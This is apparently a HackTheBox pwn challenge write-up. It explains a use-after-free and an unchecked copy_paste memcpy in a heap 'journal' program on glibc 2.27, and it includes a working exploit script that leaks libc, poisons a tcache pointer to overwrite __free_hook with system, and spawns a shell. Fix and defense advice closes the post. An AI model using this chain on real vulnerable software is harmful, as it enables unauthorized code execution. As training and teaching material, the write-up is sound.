---
layout: post
title: "Prison Break"
date: 2028-03-20 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, heap, use-after-free, tcache, glibc, free-hook, ret2libc]
description: "A prison-journal heap manager frees a note's data but keeps the pointer, and its copy_paste memcpy's into freed chunks with no re-validation — a UAF that leaks libc and poisons a tcache fd to turn __free_hook into system on glibc 2.27."
---

## Overview

Prison Break is a Medium pwn challenge on glibc 2.27 with the full mitigation set (Full RELRO, canary, NX, PIE). Two bugs — a [use-after-free](https://cwe.mitre.org/data/definitions/416.html) and a `copy_paste` that `memcpy`s into freed chunks — combine into a libc leak and a tcache poison that overwrites `__free_hook` with `system`.

## The program

A "Prison Journal" with a 10-slot array. Each `create` allocates a small metadata struct `{ data_ptr, size, inuse, day }` plus a `malloc(size)` data buffer. `delete`, `view`, and **`copy_paste`** act on slots by index.

## Bug 1 — Use-after-free

`delete` frees the data chunk but leaves the struct's `data_ptr` and `inuse` flag intact — a dangling pointer the other operations still trust.

## Bug 2 — copy_paste never re-validates

`copy_paste(copy_idx, paste_idx)` only checks `copy->size <= paste->size`, then:

```c
memcpy(paste->data, copy->data, copy->size);
```

It never confirms either slot is still live. With the UAF, that's a controlled read from — and write into — **freed** chunks.

## Exploit chain (glibc 2.27)

**1. Libc leak.** Allocate 10 journals of size `0x80`, then `delete` slots 1–8: seven fill `tcache[0x90]`, and the eighth drops into the **unsorted bin**, whose `fd` points into `main_arena`. `copy_paste(8, 0)` copies that pointer into live slot 0, and `view(0)` prints it → `libc_base = leak − 0x3ebca0`.

**2. Tcache poison.** Re-`create` slot 1 with data `p64(__free_hook − 0xb)`, then `copy_paste(1, 7)` — slot 7 is a **freed** tcache chunk, so the `memcpy` overwrites its `fd` with `__free_hook − 0xb` (the `0xb` aligns the eventual write onto the hook).

**3. Overwrite the hook.** `create` once to drain the tcache head, then `create` again — this allocation lands on `__free_hook − 0xb`, and its data `b'a'*0xb + p64(system)` places `system` at `__free_hook`.

**4. Trigger.** `create` a journal whose data is `/bin/sh\x00`, then `delete` it → `free("/bin/sh")` calls `__free_hook` = `system("/bin/sh")`.

```python
for i in range(10): alloc(i, 0x80)
for i in range(1, 9): delete(i)

copy(8, 0)
libc.address = u64(view(0)[:-1].ljust(8, b'\x00')) - 0x3ebca0

alloc(1, 0x70, data=p64(libc.sym.__free_hook - 0xb))
copy(1, 7)

alloc(2, 0x80)
alloc(3, 0x80, data=b'a'*0xb + p64(libc.sym.system))

alloc(4, 0x80, data=b'/bin/sh\x00')
delete(4)   # __free_hook -> system("/bin/sh")
```

## Why it worked

- Freeing a chunk without nulling the struct's pointer/`inuse` is a textbook UAF.
- `copy_paste` treating a freed chunk as a valid `memcpy` destination is an arbitrary write into tcache metadata — no overflow required.
- glibc 2.27 still ships `__free_hook` (removed in 2.34) and a tcache with no `fd` integrity check, so a single poisoned `fd` gives clean RCE.

## Fix / defense

- Null the struct's `data_ptr` and clear `inuse` on `delete`; refuse any operation on a not-in-use slot.
- Re-check both slots are live inside `copy_paste` before the `memcpy`.
- On glibc ≥ 2.34 the hooks are gone and tcache adds key/`fd` checks — this chain no longer applies; build against a current libc.
